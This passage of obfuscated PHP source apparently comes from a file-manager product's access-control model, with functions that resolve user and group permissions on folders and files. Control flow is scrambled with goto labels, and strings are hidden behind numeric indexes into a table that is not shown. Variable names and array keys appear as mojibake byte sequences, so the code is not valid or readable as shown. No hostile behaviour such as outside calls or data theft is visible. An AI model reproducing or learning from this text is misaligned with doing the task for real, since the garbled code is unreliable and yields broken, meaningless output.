{ $càôØ©¨⁄Ò[$Fµ‘Çï£Ãê] = $Aû∑∆ò®Ÿ[$Fµ‘Çï£Ãê]; } } goto B◊ÈÃ÷«¯Ö; BÂéñﬂ–ﬁ†: } public function authDeepCheck($AÀèÿÍ˘≈Æ, $F◊ö¨ïò‰ = false) { goto cŸÛ™÷˘öµ; cŸÛ™÷˘öµ: $eâÑÔôØêè =& $_SERVER[Öíæ€“”≠éÏË]; $F◊ö¨ïò‰ = $F◊ö¨ïò‰ ? $F◊ö¨ïò‰ : USER_ID; $Dààªí√÷™ = $this->makeAuthDeep($F◊ö¨ïò‰); goto eú∆“„–Ü◊; eãÉü“Ì‘·: if (!$B–∆€©§ÙÍ) { return !1; } $Bä™‡‹ç•É = $B–∆€©§ÙÍ ? $B–∆€©§ÙÍ[0] : $AÀèÿÍ˘≈Æ; return array($eâÑÔôØêè[408] => -1, $eâÑÔôØêè[447] => array($eâÑÔôØêè[413] => $eâÑÔôØêè[1094], $eâÑÔôØêè[1713] => $eâÑÔôØêè[191], $eâÑÔôØêè[414] => LNG($eâÑÔôØêè[1892]), $eâÑÔôØêè[1729] => $eâÑÔôØêè[1893]), $eâÑÔôØêè[1894] => LNG($eâÑÔôØêè[1895]), $eâÑÔôØêè[1896] => $this->sourceAuthInfo($Bä™‡‹ç•É)); goto Cêì≥‘ƒÛˆ; eú∆“„–Ü◊: if (!in_array($AÀèÿÍ˘≈Æ, $Dààªí√÷™[$eâÑÔôØêè[1890]])) { return !1; } $B–∆€©§ÙÍ = array(); foreach ($Dààªí√÷™[$eâÑÔôØêè[1891]] as $c◊⁄ç’ÜøÁ => $cÒ¬¡≈ò≥Ó) { if (!in_array($AÀèÿÍ˘≈Æ, $cÒ¬¡≈ò≥Ó)) { continue; } $B–∆€©§ÙÍ[] = $c◊⁄ç’ÜøÁ; } goto eãÉü“Ì‘·; Cêì≥‘ƒÛˆ: } protected function makeAuthDeep($e≈ã¯ÜÂ·Î = false) { goto a— —¶åÛë; a— —¶åÛë: $F›õÎ¿˘πæ =& $_SERVER[Öíæ€“”≠éÏË]; static $Fö¢Æè≤Ñ‹ = array(); $e≈ã¯ÜÂ·Î = $e≈ã¯ÜÂ·Î ? $e≈ã¯ÜÂ·Î : USER_ID; goto AêÁ‘ÇËÇë; EËœ∂Ç∂ñ∫: $e√„ô˜–Æº = array(); $D±ë˜‹¥÷≠ = array(); $FìøÈ›èºÁ = array(); goto dÙ¡™Î‚≥Ñ; F›¨çŸ·åç: if ($bı∞π·Êñ¨) { $B—Ëºæıèì = array(array($F›õÎ¿˘πæ[405] => SourceModel::TYPE_USER, $F›õÎ¿˘πæ[485] => $e≈ã¯ÜÂ·Î), array($F›õÎ¿˘πæ[405] => SourceModel::TYPE_GROUP, $F›õÎ¿˘πæ[485] => array($F›õÎ¿˘πæ[412], $bı∞π·Êñ¨)), $F›õÎ¿˘πæ[968] => $F›õÎ¿˘πæ[1799]); } $eãÜâ∞‚≥ë = $this->field($F›õÎ¿˘πæ[1898])->where($B—Ëºæıèì)->select(); $A«ãé≤ØÕà = array(); goto a∞ô±¿π£â; AêÁ‘ÇËÇë: if (isset($Fö¢Æè≤Ñ‹[$e≈ã¯ÜÂ·Î])) { return $Fö¢Æè≤Ñ‹[$e≈ã¯ÜÂ·Î]; } $Aá·Ç§®ª = Model($F›õÎ¿˘πæ[1897])->listData(); $B≥¨ÍÖëÉ… = array(); goto d√ë≥øê¨Ë; e—Ç‘»äº: $C ŸÉú∆»ä = $bı∞π·Êñ¨; $b√‚éË‰‹Ü = Model($F›õÎ¿˘πæ[1215]); $cÎ•™‰ıŸû = Model($F›õÎ¿˘πæ[504]); goto EËœ∂Ç∂ñ∫; dÙ¡™Î‚≥Ñ: $f◊Ì‡ÜÒÉ¡ = array(); if ($A«ãé≤ØÕà) { $cåËáæÏÇ = $b√‚éË‰‹Ü->where(array($F›õÎ¿˘πæ[396] => array($F›õÎ¿˘πæ[412], $A«ãé≤ØÕà)))->select(); foreach ($cåËáæÏÇ as $b—©„√∞¢∑) { $Aëå∞ÓÚÖ¿ = $b√‚éË‰‹Ü->parentLevelArray($b—©„√∞¢∑[$F›õÎ¿˘πæ[503]]); $dœﬁ£Í«†Ü = array_merge($dœﬁ£Í«†Ü, $Aëå∞ÓÚÖ¿); $C ŸÉú∆»ä[] = $b—©„√∞¢∑[$F›õÎ¿˘πæ[485]]; $e√„ô˜–Æº[$b—©„√∞¢∑[$F›õÎ¿˘πæ[396]]] = $Aëå∞ÓÚÖ¿; $D±ë˜‹¥÷≠[$b—©„√∞¢∑[$F›õÎ¿˘πæ[396]]] = $b—©„√∞¢∑[$F›õÎ¿˘πæ[485]]; } } $C ŸÉú∆»ä = array_values(array_unique($C ŸÉú∆»ä)); goto Fœû‚îç´Ê; d√ë≥øê¨Ë: foreach ($Aá·Ç§®ª as $dâØàÜ™Û‹) { if ($dâØàÜ™Û‹[$F›õÎ¿˘πæ[407]] == 0 && $dâØàÜ™Û‹[$F›õÎ¿˘πæ[1728]] == $F›õÎ¿˘πæ[87]) { $B≥¨ÍÖëÉ…[] = $dâØàÜ™Û‹[$F›õÎ¿˘πæ[394]]; } } $bı∞π·Êñ¨ = $this->userGroupParents($e≈ã¯ÜÂ·Î); $B—Ëºæıèì = array($F›õÎ¿˘πæ[405] => SourceModel::TYPE_USER, $F›õÎ¿˘πæ[485] => $e≈ã¯ÜÂ·Î); goto F›¨çŸ·åç; Fœû‚îç´Ê: $B‰¿ÏÏòõ∏ = $C ŸÉú∆»ä; foreach ($B‰¿ÏÏòõ∏ as $Dø“çÒ®Ò“) { $bÏóÜæÃ†ú = $cÎ•™‰ıŸû->getInfo($Dø“çÒ®Ò“); $Aëå∞ÓÚÖ¿ = $b√‚éË‰‹Ü->parentLevelArray($bÏóÜæÃ†ú[$F›õÎ¿˘πæ[503]]); $C ŸÉú∆»ä = array_merge($C ŸÉú∆»ä, $Aëå∞ÓÚÖ¿); } $C ŸÉú∆»ä = array_values(array_unique($C ŸÉú∆»ä)); goto aõîÔñ≠éè; a∞ô±¿π£â: $Bùîê¿ÉïÙ = array_to_keyvalue_group($eãÜâ∞‚≥ë, $F›õÎ¿˘πæ[396]); foreach ($Bùîê¿ÉïÙ as $bÆï“Õ¯‘è => $d‹íãô¯≠‡) { $DØï»Ñ˘â = $this->authArrayCheck($d‹íãô¯≠‡, $e≈ã¯ÜÂ·Î); if ($DØï»Ñ˘â[$F›õÎ¿˘πæ[408]] > 0) { $A«ãé≤ØÕà[] = $bÆï“Õ¯‘è . $F›õÎ¿˘πæ[33]; } } $dœﬁ£Í«†Ü = array(); goto e—Ç‘»äº; aõîÔñ≠éè: foreach ($C ŸÉú∆»ä as $Dø“çÒ®Ò“) { $bÏóÜæÃ†ú = $cÎ•™‰ıŸû->getInfo($Dø“çÒ®Ò“); $dœﬁ£Í«†Ü[] = $bÏóÜæÃ†ú[$F›õÎ¿˘πæ[85]][$F›õÎ¿˘πæ[396]]; $FìøÈ›èºÁ[$Dø“çÒ®Ò“] = $bÏóÜæÃ†ú[$F›õÎ¿˘πæ[85]][$F›õÎ¿˘πæ[396]]; $f◊Ì‡ÜÒÉ¡[$Dø“çÒ®Ò“] = $b√‚éË‰‹Ü->parentLevelArray($bÏóÜæÃ†ú[$F›õÎ¿˘πæ[503]]); } foreach ($e√„ô˜–Æº as $Cã·»Ú„§¡ => $aäÑ»ü∫âÔ) { $eò´˜úèæ¥ = $D±ë˜‹¥÷≠[$Cã·»Ú„§¡]; if (!$eò´˜úèæ¥ || !$FìøÈ›èºÁ[$eò´˜úèæ¥]) { continue; } $c∑Ç•ØË± = array(); foreach ($f◊Ì‡ÜÒÉ¡[$eò´˜úèæ¥] as $Dø“çÒ®Ò“) { $c∑Ç•ØË±[] = $FìøÈ›èºÁ[$Dø“çÒ®Ò“]; } $e√„ô˜–Æº[$Cã·»Ú„§¡] = array_merge($c∑Ç•ØË±, $aäÑ»ü∫âÔ); } $dœﬁ£Í«†Ü = array_values(array_unique($dœﬁ£Í«†Ü)); goto AÌòÉÉ•€è; AÌòÉÉ•€è: $D—¨ó∫ﬂÌÒ = array($F›õÎ¿˘πæ[1890] => $dœﬁ£Í«†Ü, $F›õÎ¿˘πæ[1891] => $e√„ô˜–Æº); $Fö¢Æè≤Ñ‹[$e≈ã¯ÜÂ·Î] = $D—¨ó∫ﬂÌÒ; return $D—¨ó∫ﬂÌÒ; goto CÍá∏óŒù∞; CÍá∏óŒù∞: } private function makeSourceAuth($bùì∞Á‡º–, $C€ûæï›ø‚, $F ¯òœ⁄Ï¢ = false) { goto Eè Âù°£Á; C¨·”æ©îÂ: foreach ($B≤¿†ÎÔÍÊ as $CÕÚÇ§É·§) { if (!isset($C€ûæï›ø‚[$CÕÚÇ§É·§])) { continue; } $A√ÛÀ‘†¡æ = $this->authMake($C€ûæï›ø‚[$CÕÚÇ§É·§], $F ¯òœ⁄Ï¢); if ($A√ÛÀ‘†¡æ[$e∫£˜Œ⁄«Ü[447]]) { $få‹üüÍæù = $A√ÛÀ‘†¡æ; break; } } if (!$A‹‹ñÖêå±) { return $få‹üüÍæù; } if (!$få‹üüÍæù && $F◊Ìí¿√ñß) { $få‹üüÍæù = $this->groupAuthInfo($F◊Ìí¿√ñß, $b€◊ÌÂŒ¥º); } goto AñÜ§ÓÃüí; d≥Ç£ñ∂â: $B≤¿†ÎÔÍÊ = Model($e∫£˜Œ⁄«Ü[1215])->parentLevelArray($bùì∞Á‡º–[$e∫£˜Œ⁄«Ü[503]]); $B≤¿†ÎÔÍÊ = array_merge(array($bùì∞Á‡º–[$e∫£˜Œ⁄«Ü[396]]), array_reverse($B≤¿†ÎÔÍÊ)); $få‹üüÍæù = !1; goto C¨·”æ©îÂ; AñÜ§ÓÃüí: if (!$få‹üüÍæù) { $aﬁ–Ô€≠Ìπ = Model($e∫£˜Œ⁄«Ü[504])->getInfo($b€◊ÌÂŒ¥º); $BÉÑä˘€ﬁ≥ = explode($e∫£˜Œ⁄«Ü[47], trim($aﬁ–Ô€≠Ìπ[$e∫£˜Œ⁄«Ü[503]], $e∫£˜Œ⁄«Ü[47])); $BÉÑä˘€ﬁ≥ = array_reverse($BÉÑä˘€ﬁ≥); foreach ($BÉÑä˘€ﬁ≥ as $BﬁÖâ©Öûã) { if ($BﬁÖâ©Öûã == $e∫£˜Œ⁄«Ü[191] || $BﬁÖâ©Öûã == $A¢“™¥Ìü®) { continue; } $B◊÷Ï¿µË– = $this->groupRootAuth($BﬁÖâ©Öûã, $F ¯òœ⁄Ï¢); if (!$B◊÷Ï¿µË–) { continue; } $få‹üüÍæù = $this->groupAuthInfo($B◊÷Ï¿µË–, $BﬁÖâ©Öûã); break; } } if (!$få‹üüÍæù || $få‹üüÍæù[$e∫£˜Œ⁄«Ü[408]] <= 0) { $A——Ú…ÇΩ£ = $this->authDeepCheck($bùì∞Á‡º–[$e∫£˜Œ⁄«Ü[396]], $F ¯òœ⁄Ï¢); if ($A——Ú…ÇΩ£) { $få‹üüÍæù = $A——Ú…ÇΩ£; } } return $få‹üüÍæù; goto AÇ”àÃõ§“; Eè Âù°£Á: $e∫£˜Œ⁄«Ü =& $_SERVER[Öíæ€“”≠éÏË]; $A¢“™¥Ìü® = $e∫£˜Œ⁄«Ü[87]; $b€◊ÌÂŒ¥º = $bùì∞Á‡º–[$e∫£˜Œ⁄«Ü[485]]; goto fî∫∂â¶∂Ü; fî∫∂â¶∂Ü: $A‹‹ñÖêå± = $bùì∞Á‡º–[$e∫£˜Œ⁄«Ü[405]] == SourceModel::TYPE_GROUP; $F◊Ìí¿√ñß = $A‹‹ñÖêå± ? $this->groupRootAuth($b€◊ÌÂŒ¥º, $F ¯òœ⁄Ï¢) : !1; if ($F◊Ìí¿√ñß && Model($e∫£˜Œ⁄«Ü[489])->authCheckAction($F◊Ìí¿√ñß[$e∫£˜Œ⁄«Ü[407]], $e∫£˜Œ⁄«Ü[1727])) { return $this->groupAuthInfo($F◊Ìí¿√ñß, $b€◊ÌÂŒ¥º); } goto d≥Ç£ñ∂â; AÇ”àÃõ§“: } private function userIsRoot($f¢ä¥Ãñáä = false) { $dãÎŸ•„ü¿ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$f¢ä¥Ãñáä && _get($GLOBALS, $dãÎŸ•„ü¿[486])) { return !0; } $CÑÆ∆ŸàÎ® = Model($dãÎŸ•„ü¿[520])->getInfo($f¢ä¥Ãñáä); $eóÃµ…∑„Â = Model($dãÎŸ•„ü¿[1899])->listData($CÑÆ∆ŸàÎ®[$dãÎŸ•„ü¿[1421]]); if ($eóÃµ…∑„Â && $eóÃµ…∑„Â[$dãÎŸ•„ü¿[493]][$dãÎŸ•„ü¿[1900]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Bë–±ã˜™•) { goto eäá±ñï÷; D™î˜îääÇ: if (!$AÛ≠ÔáÊíÏ) { return !1; } $d •ﬁ≠’õ≈->groupPathDisplay($AÛ≠ÔáÊíÏ); $b±∑Í¡¯Ö£ = array($AÛ≠ÔáÊíÏ); goto B»Ö≥ÖÑÑã; B»Ö≥ÖÑÑã: $b±∑Í¡¯Ö£ = $d •ﬁ≠’õ≈->_listAppendPath($b±∑Í¡¯Ö£); $AÛ≠ÔáÊíÏ = $b±∑Í¡¯Ö£[0]; $cπÌÏÑ¬‹Ô = $AÛ≠ÔáÊíÏ[$F‡¥”ã®Ì¶[501]]; goto e™≈èâÉå±; e™≈èâÉå±: if (isset($AÛ≠ÔáÊíÏ[$F‡¥”ã®Ì¶[509]])) { $dø±û«ï±• = explode($F‡¥”ã®Ì¶[8], trim($AÛ≠ÔáÊíÏ[$F‡¥”ã®Ì¶[501]], $F‡¥”ã®Ì¶[8])); array_shift($dø±û«ï±•); $cπÌÏÑ¬‹Ô = $AÛ≠ÔáÊíÏ[$F‡¥”ã®Ì¶[507]] . $F‡¥”ã®Ì¶[1901] . implode($F‡¥”ã®Ì¶[8], $dø±û«ï±•); } return array($F‡¥”ã®Ì¶[414] => $AÛ≠ÔáÊíÏ[$F‡¥”ã®Ì¶[28]], $F‡¥”ã®Ì¶[76] => KodIO::make($AÛ≠ÔáÊíÏ[$F‡¥”ã®Ì¶[396]]), $F‡¥”ã®Ì¶[1902] => $cπÌÏÑ¬‹Ô); goto D‡à»÷è∆; eäá±ñï÷: $F‡¥”ã®Ì¶ =& $_SERVER[Öíæ€“”≠éÏË]; $d •ﬁ≠’õ≈ = Model($F‡¥”ã®Ì¶[1215]); $AÛ≠ÔáÊíÏ = $d •ﬁ≠’õ≈->sourceInfo($Bë–±ã˜™•); goto D™î˜îääÇ; D‡à»÷è∆: } private function groupAuthInfo($aﬁ÷∂Æ¡Â∆, $bùÉÀÇ√´ù) { $B⁄¬öúÙ«Ñ =& $_SERVER[Öíæ€“”≠éÏË]; $bø≠⁄¥Ùâ÷ = Model($B⁄¬öúÙ«Ñ[504])->getInfo($bùÉÀÇ√´ù); return array($B⁄¬öúÙ«Ñ[1903] => intval($aﬁ÷∂Æ¡Â∆[$B⁄¬öúÙ«Ñ[407]]), $B⁄¬öúÙ«Ñ[1887] => $aﬁ÷∂Æ¡Â∆, $B⁄¬öúÙ«Ñ[1904] => LNG($B⁄¬öúÙ«Ñ[1905]), $B⁄¬öúÙ«Ñ[1896] => array($B⁄¬öúÙ«Ñ[414] => $bø≠⁄¥Ùâ÷[$B⁄¬öúÙ«Ñ[28]], $B⁄¬öúÙ«Ñ[76] => KodIO::make($bø≠⁄¥Ùâ÷[$B⁄¬öúÙ«Ñ[85]][$B⁄¬öúÙ«Ñ[396]]), $B⁄¬öúÙ«Ñ[1902] => $bø≠⁄¥Ùâ÷[$B⁄¬öúÙ«Ñ[508]])); } protected function groupRootAuth($AÔÀï¶Ë€À, $f¬√Òè¨ó∆ = false) { goto dÜÇ‹€Æö£; Eú°Ω¬úÃÇ: static $C¡â∞”ü‰ñ = array(); if (isset($C¡â∞”ü‰ñ[$eÉúíﬂøøÜ])) { return $C¡â∞”ü‰ñ[$eÉúíﬂøøÜ]; } $CÖÔôüÛéÉ = Model($c¡É†Ò›Ìµ[504])->getInfo($AÔÀï¶Ë€À); goto B°ŸÃã€ßÂ; d¿”∫∏ÈÆÛ: $fôÿ√πÕã¶ = $this->sourceAuthSelect($CÖÔôüÛéÉ[$c¡É†Ò›Ìµ[85]][$c¡É†Ò›Ìµ[396]]); $dÒâ¨§¡‹¬ = $fôÿ√πÕã¶ ? $this->authMake($fôÿ√πÕã¶, $f¬√Òè¨ó∆) : !1; $eÂÍ’»Ë¬È = $dÒâ¨§¡‹¬ ? $dÒâ¨§¡‹¬[$c¡É†Ò›Ìµ[447]] : !1; goto Bõç¿≈Õ©…; Bõç¿≈Õ©…: $C¡â∞”ü‰ñ[$eÉúíﬂøøÜ] = $eÂÍ’»Ë¬È ? $eÂÍ’»Ë¬È : $bÌªÙˆ√¯¥; return $C¡â∞”ü‰ñ[$eÉúíﬂøøÜ]; goto b‚¯Ω≤úÆ•; B°ŸÃã€ßÂ: $DóÑúº†Àˆ = $this->userGroupList($f¬√Òè¨ó∆); $bÌªÙˆ√¯¥ = isset($DóÑúº†Àˆ[$AÔÀï¶Ë€À]) ? $DóÑúº†Àˆ[$AÔÀï¶Ë€À][$c¡É†Ò›Ìµ[407]] : !1; if ($bÌªÙˆ√¯¥ && Model($c¡É†Ò›Ìµ[489])->authCheckAction($bÌªÙˆ√¯¥[$c¡É†Ò›Ìµ[407]], $c¡É†Ò›Ìµ[1727])) { $C¡â∞”ü‰ñ[$eÉúíﬂøøÜ] = $bÌªÙˆ√¯¥; return $bÌªÙˆ√¯¥; } goto d¿”∫∏ÈÆÛ; dÜÇ‹€Æö£: $c¡É†Ò›Ìµ =& $_SERVER[Öíæ€“”≠éÏË]; $f¬√Òè¨ó∆ = $f¬√Òè¨ó∆ ? $f¬√Òè¨ó∆ : USER_ID; $eÉúíﬂøøÜ = $f¬√Òè¨ó∆ . $c¡É†Ò›Ìµ[1906] . $AÔÀï¶Ë€À; goto Eú°Ω¬úÃÇ; b‚¯Ω≤úÆ•: } public function authOwnerApply($C•Ã∆ûöÑ‹) { goto F•¢€Èƒ∑Ñ; bÉ£ú¿é»Ï: $C•Ã∆ûöÑ‹[$D‰òåÖœΩˆ[407]][$D‰òåÖœΩˆ[1909]] = Model($D‰òåÖœΩˆ[495])->userListInfo($e“√«ŒÇÊå); return $C•Ã∆ûöÑ‹; goto eÓÿƒÔà·è; F•¢€Èƒ∑Ñ: $D‰òåÖœΩˆ =& $_SERVER[Öíæ€“”≠éÏË]; if (empty($C•Ã∆ûöÑ‹[$D‰òåÖœΩˆ[407]]) || isset($C•Ã∆ûöÑ‹[$D‰òåÖœΩˆ[1907]]) && $C•Ã∆ûöÑ‹[$D‰òåÖœΩˆ[1907]]) { return $C•Ã∆ûöÑ‹; } if (AuthModel::authCheckRoot($C•Ã∆ûöÑ‹[$D‰òåÖœΩˆ[407]][$D‰òåÖœΩˆ[408]])) { return $C•Ã∆ûöÑ‹; } goto c€∞°É›Í¡; EÀ∫ã„®Öê: $eá®ä∑®éù = array(); $e“√«ŒÇÊå = array(); foreach ($EüêŸ∞í‹ˆ as $cö”¡ñ“‘Ì => $aπñ¬ïº¿¡) { $AÚä‹âÖ·‹ = $this->authFolderOwnerUser($aπñ¬ïº¿¡); $eá®ä∑®éù[$cö”¡ñ“‘Ì] = $AÚä‹âÖ·‹; $e“√«ŒÇÊå = array_merge($e“√«ŒÇÊå, $AÚä‹âÖ·‹[$D‰òåÖœΩˆ[576]]); if ($AÚä‹âÖ·‹[$D‰òåÖœΩˆ[1908]]) { break; } } goto bå°äÿ⁄ˆË; bå°äÿ⁄ˆË: if (count($e“√«ŒÇÊå) == 0) { $e“√«ŒÇÊå = $this->authFolderOwnerGroup($C•Ã∆ûöÑ‹[$D‰òåÖœΩˆ[485]]); } $e“√«ŒÇÊå = array_unique($e“√«ŒÇÊå); if (AuthModel::authCheckRoot($C•Ã∆ûöÑ‹[$D‰òåÖœΩˆ[407]][$D‰òåÖœΩˆ[408]])) { $e“√«ŒÇÊå[] = USER_ID; } goto bÉ£ú¿é»Ï; c€∞°É›Í¡: $aƒ¨‹¯ÒøÚ = Model($D‰òåÖœΩˆ[1215])->parentLevelArray($C•Ã∆ûöÑ‹[$D‰òåÖœΩˆ[503]]); $aƒ¨‹¯ÒøÚ = array_merge(array($C•Ã∆ûöÑ‹[$D‰òåÖœΩˆ[396]]), array_reverse($aƒ¨‹¯ÒøÚ)); $EüêŸ∞í‹ˆ = $this->sourceAuthSelect($aƒ¨‹¯ÒøÚ); goto EÀ∫ã„®Öê; eÓÿƒÔà·è: } private function authFolderOwnerGroup($CË´Œ‹›ËÆ) { $Dè»≠≠º ï =& $_SERVER[Öíæ€“”≠éÏË]; $Díü‡â¬≈æ = Model($Dè»≠≠º ï[1793])->where(array($Dè»≠≠º ï[1707] => $CË´Œ‹›ËÆ))->select(); $B¢¶é”®Á¿ = array(); if (!$Díü‡â¬≈æ) { return $B¢¶é”®Á¿; } foreach ($Díü‡â¬≈æ as $e»î∫¥û¡…) { $eÙüÙ€¨à˘ = $this->authInfo($e»î∫¥û¡…); if (AuthModel::authCheckRoot($eÙüÙ€¨à˘[$Dè»≠≠º ï[407]])) { $B¢¶é”®Á¿[] = $e»î∫¥û¡…[$Dè»≠≠º ï[1538]]; } } return $B¢¶é”®Á¿; } private function authFolderOwnerUser($Dø÷ÁÏ∆µó) { $FåÜõúÑ–Ú =& $_SERVER[Öíæ€“”≠éÏË]; $CéÛü‡›Ö‘ = array(); $C‹ë©√≥Áä = !1; foreach ($Dø÷ÁÏ∆µó as $eëêú Ú‰Ò) { $cé¢öπÈõ¬ = $this->authInfo($eëêú Ú‰Ò); if ($eëêú Ú‰Ò[$FåÜõúÑ–Ú[485]] == $FåÜõúÑ–Ú[191]) { $C‹ë©√≥Áä = !0; } if ($eëêú Ú‰Ò[$FåÜõúÑ–Ú[405]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($cé¢öπÈõ¬[$FåÜõúÑ–Ú[407]])) { $CéÛü‡›Ö‘[] = $eëêú Ú‰Ò[$FåÜõúÑ–Ú[485]]; } } } return array($FåÜõúÑ–Ú[576] => $CéÛü‡›Ö‘, $FåÜõúÑ–Ú[1908] => $C‹ë©√≥Áä); } public function authMake($A¢·£¿‡ÿˆ, $d‘©¢óÖ≥Ö = false) { $d£áﬂ„ËÇ≤ =& $_SERVER[Öíæ€“”≠éÏË]; $b¥•∂Èë√á = $this->authArrayCheck($A¢·£¿‡ÿˆ, $d‘©¢óÖ≥Ö); if ($b¥•∂Èë√á[$d£áﬂ„ËÇ≤[1910]]) { $b¥•∂Èë√á[$d£áﬂ„ËÇ≤[1910]] = $this->sourceAuthInfo($b¥•∂Èë√á[$d£áﬂ„ËÇ≤[1910]]); } return $b¥•∂Èë√á; } public function authArrayCheck($c«¬Í´ﬂœﬂ, $dü—¯©áÊ“ = false) { goto C€∏∆Ùö∫ê; C€∏∆Ùö∫ê: $e®àÓí‘Æø =& $_SERVER[Öíæ€“”≠éÏË]; if (!$c«¬Í´ﬂœﬂ) { return array($e®àÓí‘Æø[408] => 0, $e®àÓí‘Æø[447] => !1); } $dü—¯©áÊ“ = $dü—¯©áÊ“ ? $dü—¯©áÊ“ : USER_ID; goto fÊÉ©Æ¿ö•; Aò√√âá”‚: $FáÎ«ÆØ¥Ï = 0; $câƒæﬁöµÁ = 0; $b„”Õ˘€ãÌ = 0; goto b ™´ÜÏ∆ê; B—êóÇ›ïë: $FÕÉ‘Ôºâ˘ = 0; $F≠¨–ÌÈç± = 0; $Dﬁ«®ÚÒò· = array($e®àÓí‘Æø[396] => 0); goto C—⁄úõôïë; C—⁄úõôïë: foreach ($c«¬Í´ﬂœﬂ as $Dﬁ«®ÚÒò·) { $cËÉ‚∆Ëóø = $this->authInfo($Dﬁ«®ÚÒò·); if (!$cËÉ‚∆Ëóø) { continue; } $a´éÓ‘ÔŒƒ = $Dﬁ«®ÚÒò·[$e®àÓí‘Æø[485]]; $bé√Öº–ï® = intval($cËÉ‚∆Ëóø[$e®àÓí‘Æø[407]]); if ($Dﬁ«®ÚÒò·[$e®àÓí‘Æø[405]] == SourceModel::TYPE_USER && $a´éÓ‘ÔŒƒ == $dü—¯©áÊ“) { $aùîóñŒ√¬ = !0; $b¢¨ﬂâç ç = $cËÉ‚∆Ëóø; $BŸÂßÙò¶– = $bé√Öº–ï®; } else { if ($Dﬁ«®ÚÒò·[$e®àÓí‘Æø[405]] == SourceModel::TYPE_GROUP && $this->groupContainUser($a´éÓ‘ÔŒƒ, $dü—¯©áÊ“)) { $FáÎ«ÆØ¥Ï = !0; $d‰ÇôÃ ‘» = $this->groupStepToUserGroup($a´éÓ‘ÔŒƒ, $dü—¯©áÊ“); if ($d‰ÇôÃ ‘» < $cóÿÌäœ¥›) { $cóÿÌäœ¥› = $d‰ÇôÃ ‘»; $câƒæﬁöµÁ = $bé√Öº–ï®; $b„”Õ˘€ãÌ = $cËÉ‚∆Ëóø; $D®ñô°√¿ = $a´éÓ‘ÔŒƒ; } if ($d‰ÇôÃ ‘» == $cóÿÌäœ¥› && $bé√Öº–ï® >= $câƒæﬁöµÁ) { $câƒæﬁöµÁ = $bé√Öº–ï®; $b„”Õ˘€ãÌ = $cËÉ‚∆Ëóø; $D®ñô°√¿ = $a´éÓ‘ÔŒƒ; } } else { if ($a´éÓ‘ÔŒƒ == $e®àÓí‘Æø[191]) { $C∆®Û£∆äç = !0; $F≠¨–ÌÈç± = $cËÉ‚∆Ëóø; $FÕÉ‘Ôºâ˘ = $bé√Öº–ï®; } } } } if ($aùîóñŒ√¬) { $fπáÎˆµ§Ë = $BŸÂßÙò¶–; $cËÉ‚∆Ëóø = $b¢¨ﬂâç ç; $dë≠ãåÌ–¿ = LNG($e®àÓí‘Æø[1911]); } else { if ($FáÎ«ÆØ¥Ï) { $fπáÎˆµ§Ë = $câƒæﬁöµÁ; $cËÉ‚∆Ëóø = $b„”Õ˘€ãÌ; $Fß◊ı⁄åÊÏ = Model($e®àÓí‘Æø[504])->getInfo($D®ñô°√¿); $dë≠ãåÌ–¿ = $e®àÓí‘Æø[160] . $Fß◊ı⁄åÊÏ[$e®àÓí‘Æø[508]] . $e®àÓí‘Æø[1912] . LNG($e®àÓí‘Æø[1913]); } else { if ($C∆®Û£∆äç) { $fπáÎˆµ§Ë = $FÕÉ‘Ôºâ˘; $cËÉ‚∆Ëóø = $F≠¨–ÌÈç±; $dë≠ãåÌ–¿ = LNG($e®àÓí‘Æø[1884]); } else { $fπáÎˆµ§Ë = 0; $cËÉ‚∆Ëóø = !1; $dë≠ãåÌ–¿ = $e®àÓí‘Æø[33]; } } } $A»£Ë€÷ßÖ = array($e®àÓí‘Æø[1903] => intval($fπáÎˆµ§Ë), $e®àÓí‘Æø[1887] => $cËÉ‚∆Ëóø, $e®àÓí‘Æø[1904] => $dë≠ãåÌ–¿, $e®àÓí‘Æø[1896] => $Dﬁ«®ÚÒò·[$e®àÓí‘Æø[396]]); goto bÍöº≤§÷€; b ™´ÜÏ∆ê: $cóÿÌäœ¥› = 1000; $D®ñô°√¿ = 0; $C∆®Û£∆äç = 0; goto B—êóÇ›ïë; bÍöº≤§÷€: return $A»£Ë€÷ßÖ; goto B√ÆâÑø›‚; fÊÉ©Æ¿ö•: $aùîóñŒ√¬ = 0; $BŸÂßÙò¶– = 0; $b¢¨ﬂâç ç = 0; goto Aò√√âá”‚; B√ÆâÑø›‚: } private function groupContainUser($dΩÀ œË‰‚, $DõÒÙÏÊ†é = false) { return in_array($dΩÀ œË‰‚, $this->userGroupParents($DõÒÙÏÊ†é)); } private function groupStepToUserGroup($Eé•† ù¨ç, $b…•ù¶Ÿªæ = false) { goto b•Ñπ˜õ»≠; E»Üâ‰Î§ã: return $EªŒ´è‰ı≈; goto DÜÜßèª´é; b•Ñπ˜õ»≠: $aÔ∑ªä≠£ÿ =& $_SERVER[Öíæ€“”≠éÏË]; $cÉî ÜÆ„∆ = $this->userGroupList($b…•ù¶Ÿªæ); $EªŒ´è‰ı≈ = 1000; goto f∞∑÷Á∂Ø‡; f∞∑÷Á∂Ø‡: $AéŒ≤∑£Ωï = $GLOBALS[$aÔ∑ªä≠£ÿ[6]][$aÔ∑ªä≠£ÿ[88]][$aÔ∑ªä≠£ÿ[1804]] == 1; $Bëñ∏≥√óÀ = $AéŒ≤∑£Ωï ? 3 : 2; foreach ($cÉî ÜÆ„∆ as $bñö˘Õ”ÎÁ) { if ($bñö˘Õ”ÎÁ[$aÔ∑ªä≠£ÿ[1707]] == $Eé•† ù¨ç) { return 0; } $b…´Êûç˜µ = explode($aÔ∑ªä≠£ÿ[47], trim($bñö˘Õ”ÎÁ[$aÔ∑ªä≠£ÿ[503]], $aÔ∑ªä≠£ÿ[47])); if ($b…´Êûç˜µ[0] == $aÔ∑ªä≠£ÿ[191] && count($b…´Êûç˜µ) > $Bëñ∏≥√óÀ) { $fïóœûãûò = array_reverse(array_slice($b…´Êûç˜µ, $Bëñ∏≥√óÀ)); $CÁ∂Ì≠∑õ˘ = array_search($Eé•† ù¨ç, $fïóœûãûò); if ($CÁ∂Ì≠∑õ˘ !== !1 && $CÁ∂Ì≠∑õ˘ + 1 <= $EªŒ´è‰ı≈) { $EªŒ´è‰ı≈ = $CÁ∂Ì≠∑õ˘ + 1; } } } goto E»Üâ‰Î§ã; DÜÜßèª´é: } private function userGroupList($e∏Õ®µÛ¢å = false) { $a˜èäéÆ¡˜ =& $_SERVER[Öíæ€“”≠éÏË]; static $cìÊùØÇÉ⁄ = array(); if (isset($cìÊùØÇÉ⁄[$e∏Õ®µÛ¢å])) { return 